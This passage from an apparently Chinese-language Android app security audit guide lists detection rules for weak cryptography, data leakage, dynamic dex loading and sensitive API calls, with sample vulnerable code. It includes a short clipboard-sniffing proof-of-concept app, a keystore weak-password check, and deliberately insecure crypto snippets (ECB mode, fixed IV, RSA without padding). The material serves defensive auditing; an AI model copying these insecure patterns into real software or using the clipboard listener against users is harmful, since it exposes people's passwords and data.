class="number">512</span>);</span><br><span class="line">    <span class="type">KeyPair</span> <span class="variable">key</span> <span class="operator">=</span> keyGen.generateKeyPair();</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的smali代码如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;getInstance(Ljava<span class="regexp">/lang/</span>String;)Ljava<span class="regexp">/security/</span>KeyPairGenerator;</span><br><span class="line"></span><br><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;initialize(I)V</span><br></pre></td></tr></table></figure><p>通过匹配上述函数，并根据initialize函数的参数值判断。</p><p><strong>建议</strong>：</p><p>在使用RSA加密时，建议密钥长度大于1024bit</p><h3 id="AES-ECB弱加密风险检测"><a href="#AES-ECB弱加密风险检测" class="headerlink" title="AES-ECB弱加密风险检测"></a>AES-ECB弱加密风险检测</h3><p>AES的ECB加密模式容易遭到字典攻击，安全性不够</p><p><strong>风险等级：</strong>低危</p><p><strong>问题示例：</strong></p><p>第一步，检测以下函数：</p><ul><li>getInstance(String transformation)</li><li>getInstance(String transformation, String provider)</li><li>getInstance(String transformation, Provider provider)</li></ul><p>第二步，检测上述函数第一个参数值出现以下情况的任意一种，即可认为该检测项不安全，标记为<code>低危</code>。</p><ul><li>“AES”，Android提供的AES加密算法API默认使用ECB模式</li><li>“DES”，DES默认是56位加密密钥，已经不安全</li><li>“AES/ECB/xxx”</li><li>“DES/ECB/xxx”</li><li>“DESede/ECB/xxx”</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(keyBytes, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS7Padding&quot;</span>, <span class="string">&quot;BC&quot;</span>);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>建议</strong></p><p>避免使用ECB模式，建议使用CBC模式</p><h3 id="IVParameterSpec不安全初始化向量检测"><a href="#IVParameterSpec不安全初始化向量检测" class="headerlink" title="IVParameterSpec不安全初始化向量检测"></a>IVParameterSpec不安全初始化向量检测</h3><p>使用IVParameterSpec函数，如果使用了固定的初始化向量，那么密码文本可预测性高得多，容易收到字典攻击。</p><p><strong>风险等级：</strong>低危</p><p><strong>问题示例：</strong></p><p>初始化向量时，使用了硬编码到程序的常量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] iv = &#123; <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line"><span class="type">IvParameterSpec</span> <span class="variable">ips</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv)</span><br></pre></td></tr></table></figure><p>匹配<code>Ljavax/crypto/spec/IvParameterSpec;-&gt;&lt;init&gt;([B)V</code>函数</p><p><strong>建议</strong></p><p>IVParameterSpec初始化时，不使用常量vector。</p><h3 id="RSA中不使用Padding风险检测"><a href="#RSA中不使用Padding风险检测" class="headerlink" title="RSA中不使用Padding风险检测"></a>RSA中不使用Padding风险检测</h3><p>使用RSA公钥时通常会绑定一个padding，原因是为了防止一些依赖于no padding时对RSA算法的攻击</p><p><strong>风险等级：</strong>低危</p><p><strong>问题示例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">rsa</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    rsa = javax.crypto.Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (java.security.NoSuchAlgorithmException e) &#123;&#125;</span><br><span class="line">  <span class="keyword">catch</span> (javax.crypto.NoSuchPaddingException e) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;RSA&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>用正则表达式<code>RSA/(\w)&#123;3&#125;/NoPadding</code>匹配字符串常量</p><p><strong>建议：</strong></p><p>建议使用Padding模式。</p><h3 id="KeyStore弱密码风险检测"><a href="#KeyStore弱密码风险检测" class="headerlink" title="KeyStore弱密码风险检测"></a>KeyStore弱密码风险检测</h3><p>keytool是一个java数据证书的管理工具，</p><p>keytool将密钥(key，私钥和公钥配对)和证书(certificates)存在一个称为keystore的文件中，并通过密码保护keystore中的密钥。如果密码设置过于简单，例如：123456、android等，则会导致keystore文件的私钥泄露，从而导致一系列的信息泄露风险。</p><p><strong>风险等级</strong>：<code>高危</code></p><p><strong>检测方法</strong></p><p>方法一）基于keytool命令行检测：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">keytool</span> -list -keystore <span class="literal">debug</span>.keystore</span><br></pre></td></tr></table></figure><p>然后输入不安全的弱密码，若正常输出，表明该keystore文件存在弱密码风险</p><p>（方法二）基于pyjks的第三方python解析库</p><p>安装<code>pip install pyjks</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_keystore_pwd</span>(<span class="params">self, jks_file, pwd</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jks.KeyStore.load(jks_file, pwd)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>然后通过常见的弱密码组合进行payload测试。</p><p><strong>建议</strong>：</p><p>提高keystore保护密码的强度。</p><h2 id="数据安全检测"><a href="#数据安全检测" class="headerlink" title="数据安全检测"></a>数据安全检测</h2><h3 id="敏感信息检测"><a href="#敏感信息检测" class="headerlink" title="敏感信息检测"></a>敏感信息检测</h3><p>通过正则表达式匹配敏感信息</p><p>我们可以通过如下的几个正则表达式，匹配邮箱地址，手机号，电话号码，身份证和qq等敏感的信息，看是否有在代码中出现，提醒开发者注意这些敏感信息，防止不必要的外泄</p><p>邮箱地址</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp5</span> <span class="operator">=</span> <span class="string">&quot;[<span class="char escape_">\w</span>.-]+@[<span class="char escape_">\w</span>-]+<span class="char escape_">\.</span>[<span class="char escape_">\w</span>.]+&quot;</span></span><br></pre></td></tr></table></figure><p>手机号</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp6 = &quot;^(<span class="number">13</span>[<span class="number">0</span>-<span class="number">9</span>]|<span class="number">14</span>[<span class="number">5</span>|<span class="number">7</span>]|<span class="number">15[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>]|<span class="number">18[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>])\d&#123;<span class="number">8</span>&#125;$&quot;</span><br></pre></td></tr></table></figure><p>电话号码</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp7</span> <span class="operator">=</span> <span class="string">&quot;<span class="char escape_">\d</span>&#123;3&#125;-<span class="char escape_">\d</span>&#123;8&#125;|<span class="char escape_">\d</span>&#123;4&#125;-<span class="char escape_">\d</span>&#123;7&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>身份证号</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp8</span> <span class="operator">=</span> <span class="string">&quot;^<span class="char escape_">\d</span>&#123;15&#125;|<span class="char escape_">\d</span>&#123;18&#125;$&quot;</span></span><br></pre></td></tr></table></figure><p>QQ号</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">regexp9</span> <span class="operator">=</span> <span class="string">&quot;[1-9][0-9]&#123;4,&#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="剪贴板敏感信息泄露风险检测"><a href="#剪贴板敏感信息泄露风险检测" class="headerlink" title="剪贴板敏感信息泄露风险检测"></a>剪贴板敏感信息泄露风险检测</h3><p>由于Android剪贴板的内容向任何权限的app开放，很容易被嗅探泄密，同一部手机中安装的其他app，甚至是一些权限不高的app，都可以通过剪贴板功能获取剪贴板中的敏感信息</p><p><strong>风险等级：</strong>提醒</p><p><strong>问题示例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">clipBtn = (Button) findViewById(R.id.btn_clip);</span><br><span class="line">clipBtn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">ClipboardManager</span> <span class="variable">clipboard</span> <span class="operator">=</span> (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClipData</span> <span class="variable">clip1</span> <span class="operator">=</span> ClipData.newPlainText(<span class="string">&quot;label&quot;</span>,<span class="string">&quot;password=123456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clipboard.setPrimaryClip(clip1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>漏洞可以利用如下代码利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line"><span class="type">ClipboardManager</span> <span class="variable">clipBoard</span> <span class="operator">=</span> (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line">clipBoard.addPrimaryClipChangedListener( <span class="keyword">new</span> <span class="title class_">ClipboardListener</span>() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">ClipboardManager</span> <span class="variable">cm</span> <span class="operator">=</span> (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line"><span class="type">ClipData</span> <span class="variable">cd2</span> <span class="operator">=</span> cm.getPrimaryClip();</span><br><span class="line"><span class="type">String</span> <span class="variable">clipText</span> <span class="operator">=</span> cd2.getItemAt(<span class="number">0</span>).getText().toString();</span><br><span class="line"><span class="comment">//Log.v(&quot;clipboard&quot;, &quot;Attacked: &quot; + clipText);</span></span><br><span class="line">Toast.makeText(getApplicationContext(), <span class="string">&quot;Attacked: &quot;</span> + clipText, Toast.LENGTH_LONG).show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClipboardListener</span> <span class="keyword">implements</span> <span class="title class_">ClipboardManager</span>.OnPrimaryClipChangedListener &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPrimaryClipChanged</span><span class="params">()</span> &#123;</span><br><span class="line">   attack();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>建议：</strong></p><p>避免使用剪贴板明文存储敏感信息或进行加密。</p><h3 id="Intent敏感数据泄露风险检测"><a href="#Intent敏感数据泄露风险检测" class="headerlink" title="Intent敏感数据泄露风险检测"></a>Intent敏感数据泄露风险检测</h3><p>APP创建Intent传递数据到其他Activity，如果创建的Activity不是在同一个Task中打开，就很可能被其他的Activity劫持读取到Intent内容，跨Task的Activity通过Intent传递敏感信息是不安全的。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例：</strong></p><p>检测是否使用了FLAG_ACTIVITY_NEW_TASK标志。</p><p><strong>建议：</strong></p><p>尽量避免使用包含FLAG_ACTIVITY_NEW_TASK标志的Intent来传递敏感信息。</p><h3 id="PendingIntent误用风险"><a href="#PendingIntent误用风险" class="headerlink" title="PendingIntent误用风险"></a>PendingIntent误用风险</h3><p>使用pendingIntent时候，如果使用了一个空Intent，会导致恶意用户劫持Intent的内容。禁止使用空intent去构造pendingIntent。</p><p>风险等级：<code>中危</code></p><p>问题示例：</p><p>通过判断代码片段中有没有出现以下函数，即可知道是否使用了空intent构造PendingIntent。</p><p><img src="2025-01-15-App安全分析指南/image-20240920195326209.png" alt="image-20240920195326209"></p><p><strong>建议：</strong></p><p>禁止使用空intent去构造pendingIntent。</p><h3 id="密钥硬编码风险检测"><a href="#密钥硬编码风险检测" class="headerlink" title="密钥硬编码风险检测"></a>密钥硬编码风险检测</h3><p>将密钥硬编码在Java代码、文件中，这样做会引起很大风险。<strong>信息安全的基础在于密码学，而常用的密码学算法都是公开的，加密内容的保密依靠的是密钥的保密</strong>，密钥如果泄露，对于对称密码算法，根据用到的密钥算法和加密后的密文，很容易得到加密前的明文；对于非对称密码算法或者签名算法，根据密钥和要加密的明文，很容易获得计算出签名值，从而伪造签名。</p><p>风险等级：<code>提醒</code></p><p>检测使用以下加密算法的路径，目前该检测项只检测是否在Java层有<strong>显式地</strong>保存密钥，这应该是最有风险的一种保存方式。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AES<span class="regexp">/CBC/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/CBC/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/CTR/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/GCM/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>PKCS1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">1</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">224</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">256</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">384</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">512</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPPadding</span><br></pre></td></tr></table></figure><h3 id="数据或程序加载检查"><a href="#数据或程序加载检查" class="headerlink" title="数据或程序加载检查"></a>数据或程序加载检查</h3><p><strong>风险等级：</strong>提醒</p><p>需要进行动态分析</p><ul><li>是否加载公共区域程序，如sdcard、/data/local/tmp/、应用自创建但其他应用有读写权限的目录上</li><li>是否从网络下载，检测方法包括：阅读代码、监听网路请求、见识存储区域文件读写、查看安装包</li><li>升级包是否存在公共区域存储</li></ul><h3 id="BASE64安全检测"><a href="#BASE64安全检测" class="headerlink" title="BASE64安全检测"></a>BASE64安全检测</h3><p>风险等级：<code>提醒</code></p><p>检测出BASE64字符串，并解密。</p><h3 id="文件全局读写漏洞检测"><a href="#文件全局读写漏洞检测" class="headerlink" title="文件全局读写漏洞检测"></a>文件全局读写漏洞检测</h3><p>在使用getDir，getSharedPreferences或openFileOutput时，如果设置了全局的可读权限，攻击者恶意读取文件内容，获取敏感信息。在设置文件属性时如果设置全局可写，攻击者可能会篡改、伪造内容，可能会进行诈骗等行为，造成用户财产损失。其中getSharedPreferences如果设置全局写权限，则当攻击app跟被攻击app具有相同的<code>Android:sharedUserId</code>属性时和签名时，攻击app则可以访问到内部存储文件进行写入操作。</p><p><strong>风险等级</strong>：<code>中危</code></p><p><strong>问题示例：</strong></p><p>检测出使用了getDir、getSharedPreferences和openFileOutput函数的参数值是否使用了<code>MODE_WORLD_READABLE和MODE_WORLD_WRITEABLE</code>。</p><p><strong>建议</strong>：</p><ul><li>使用MODE_PRIVATE模式创建内部存储文件</li><li>加密存储敏感数据</li><li>避免在文件中存储明文敏感信息</li><li>避免滥用”Android:sharedUserId”属性</li></ul><p>如果两个app<code>Android:sharedUserId</code>属性相同，切使用的签名也相同，则这两个app可以互相访问内部存储文件数据。</p><h3 id="日志泄露风险检测"><a href="#日志泄露风险检测" class="headerlink" title="日志泄露风险检测"></a>日志泄露风险检测</h3><p>在APP的开发过程中，为了方便调试，通常会使用log函数输出一些关键流程的信息，这些信息中通常会包含敏感内容，如执行流程、明文的用户名密码等，这会让攻击者更加容易的了解APP内部结构方便破解和攻击，甚至直接获取到有价值的敏感信息。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>检测是否调用了Log.v、Log.d、Log.e、Log.i、Log.w、Log.f、Log.s函数</p><p><strong>建议</strong>：</p><p>在生产环境中移除Log打印。</p><h3 id="外部加载dex检测"><a href="#外部加载dex检测" class="headerlink" title="外部加载dex检测"></a>外部加载dex检测</h3><p>动态加载的dex文件存储在被其他应用任意读写的目录中(如sdcard)，如果没有对外部所加载的dex文件做完整性检验，应用将会被恶意代码注入，从而执行恶意代码</p><p><strong>风险等级：</strong>高危</p><p><strong>问题示例：</strong></p><p>关键：public DexClassLoader (String dexPath, String optimizedDirectory, String libraryPath, ClassLoader parent)</p><p>首先获取所有调用了DexClassLoader函数的路径，然后对每个路径下的代码片段进行检查，判断有没有调用<code>Environment.getExternalStorageDirectory().toString()</code>该方法。两个条件同时满足，则判定该路径下的代码片段有风险。</p><p><strong>建议：</strong></p><ul><li>将所需要动态加载的DEX/APK文件放置在APK内部或应用私有目录中</li><li>使用加密网络协议进行下载加载的DEX/APK文件并将其放置在应用私有目录中</li><li>对不可信的加载来源进行完整性校验</li></ul><h3 id="外部存储路径检测"><a href="#外部存储路径检测" class="headerlink" title="外部存储路径检测"></a>外部存储路径检测</h3><p>文件存放在external storage，例如sd卡，是全局可读可写的，由于external storage可以被任意用户操作，且可以被所有应用修改使用，所有，app的敏感数据建议不要存放在external storage</p><p><strong>风险等级：</strong>低危</p><p>动态方法监测<code>/data/data/&lt;packagename&gt;/</code>目录下所有生成的目录是否带有明文信息泄露</p><h3 id="明文数字证书风险"><a href="#明文数字证书风险" class="headerlink" title="明文数字证书风险"></a>明文数字证书风险</h3><p>Apk中使用的数字证书可被用来校验服务器的合法身份，以及在与服务器进行通信的过程中对传输数据进行加密、解密运算，保证传输数据的保密性、完整性。明文存储的数字证书如果被篡改，客户端可能连接到假冒的服务端上，导致用户名、密码等信息被窃取；如果明文证书被盗取，可能造成传输数据被截获解密，用户信息泄露，或者伪造客户端向服务器发送请求，篡改服务器中的用户数据或造成服务器响应异常。</p><p><strong>风险等级</strong>：<code>中危</code></p><p><strong>问题示例</strong>：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&quot;assets/location_public_key.der&quot;</span>,</span><br><span class="line">    <span class="string">&quot;assets/verisign.cer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;res/raw/servicecert.cer&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="敏感函数调用检测"><a href="#敏感函数调用检测" class="headerlink" title="敏感函数调用检测"></a>敏感函数调用检测</h2><h3 id="安全相关的函数检测"><a href="#安全相关的函数检测" class="headerlink" title="安全相关的函数检测"></a>安全相关的函数检测</h3><p>一些存放敏感的安全配置信息的<strong>函数</strong>，一般函数名都可能带有encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等关键字。</p><p>通过encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等和安全相关的关键字进行匹配查找，然后逐个检测类的安全性。</p><h3 id="安全相关的类检测"><a href="#安全相关的类检测" class="headerlink" title="安全相关的类检测"></a>安全相关的类检测</h3><p>一些存放敏感的安全配置信息的<strong>文件</strong>，一般文件都可能带有encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等关键字。</p><p>通过encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等和安全相关的关键字进行匹配查找，然后逐个检测类的安全性。</p><h3 id="运行命令检测"><a href="#运行命令检测" class="headerlink" title="运行命令检测"></a>运行命令检测</h3><p>检测 命令执行相关的代码</p><p><strong>问题示例：</strong></p><p>Java代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;ls -al&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;ls -al&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure><h3 id="Native-Library加载检测"><a href="#Native-Library加载检测" class="headerlink" title="Native Library加载检测"></a>Native Library加载检测</h3><p>检测加载so文件的Native方法。</p><p><strong>风险等级</strong>：<code>提示</code></p><p>Java代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;libtest.so&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/lang/</span>System;-&gt;loadLibrary(Ljava<span class="regexp">/lang/</span>String;)V</span><br></pre></td></tr></table></figure><h3 id="外部动态加载dex检测"><a href="#外部动态加载dex检测" class="headerlink" title="外部动态加载dex检测"></a>外部动态加载dex检测</h3><p>在Android4.1之前的系统版本，允许应用在全局可读可写的位置动态加载dex文件，有文件被替换的风险</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>需要检测代码中的DexClassLoader和Android版本，只有Android版本 &lt; 4.1才会出现该漏洞。</p><p>Java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DexClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(</span><br><span class="line">    optimizedDexOutputPath.getAbsolutePath(),              <span class="comment">//参数1</span></span><br><span class="line">    Environment.getExternalStorageDirectory().toString(),  <span class="comment">//参数2</span></span><br><span class="line">    <span class="literal">null</span>,                                                  <span class="comment">//参数3</span></span><br><span class="line">    getClassLoader());                                     <span class="comment">//参数4</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">Ldalvik<span class="symbol">/system/DexClassLoader</span>;<span class="operator">-&gt;</span><span class="symbol">&lt;init&gt;</span>(Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/String</span>;</span><br><span class="line"></span><br><span class="line">Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/ClassLoader</span>;)V</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>建议</strong></p><ul><li>禁止外部（不安全的源）加载DEX，将所需要动态加载的DEX/APK文件放置到APK内部或应用私有目录中。</li><li>使用加密网络协议进行下载加载的DEX/APK文件并将其放置到应用私有目录中。</li><li>对不可信的加载来源进行完整性校验。</li></ul><h3 id="root代码检测"><a href="#root代码检测" class="headerlink" title="root代码检测"></a>root代码检测</h3><p>检查app是否有执行检测root环境的代码。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;su&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;su&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure><h3 id="获取IMEI-和Device-ID敏感信息代码检测"><a href="#获取IMEI-和Device-ID敏感信息代码检测" class="headerlink" title="获取IMEI 和Device ID敏感信息代码检测"></a>获取IMEI 和Device ID敏感信息代码检测</h3><p>检查app是否有执行获取IMEI和Device ID敏感信息的代码。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TelephonyManager tm <span class="operator">=</span> (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">String DEVICE_ID <span 